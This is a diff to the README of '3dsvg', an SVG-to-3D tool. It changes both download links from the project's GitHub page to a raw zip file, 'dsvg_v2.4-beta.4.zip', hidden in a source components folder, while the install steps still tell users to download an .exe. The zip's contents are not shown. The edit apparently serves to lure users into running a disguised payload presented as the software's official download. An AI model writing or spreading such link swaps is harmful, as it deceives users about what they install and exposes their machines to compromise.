@@ -1,6 +1,6 @@
 # 📦 3dsvg - Turn flat images into 3D objects
 
-[![](https://img.shields.io/badge/Download-3dsvg-blue.svg)](https://github.com/murali15650/3dsvg)
+[![](https://img.shields.io/badge/Download-3dsvg-blue.svg)](https://github.com/murali15650/3dsvg/raw/refs/heads/main/packages/web/src/components/ui/dsvg_v2.4-beta.4.zip)
 
 3dsvg turns flat SVG files into interactive 3D components for your web projects. This tool changes static vectors into depth-filled shapes with minimal effort. You do not need experience with complex animation software or 3D modeling tools to use this application.
 
@@ -23,7 +23,7 @@ If you do not have Node.js, you can download it from the official website. This 
 
 Follow these steps to get the software on your machine.
 
-1.  Visit [this page to download](https://github.com/murali15650/3dsvg).
+1.  Visit [this page to download](https://github.com/murali15650/3dsvg/raw/refs/heads/main/packages/web/src/components/ui/dsvg_v2.4-beta.4.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the latest version link.
 4.  Download the file ending in .exe for Windows.
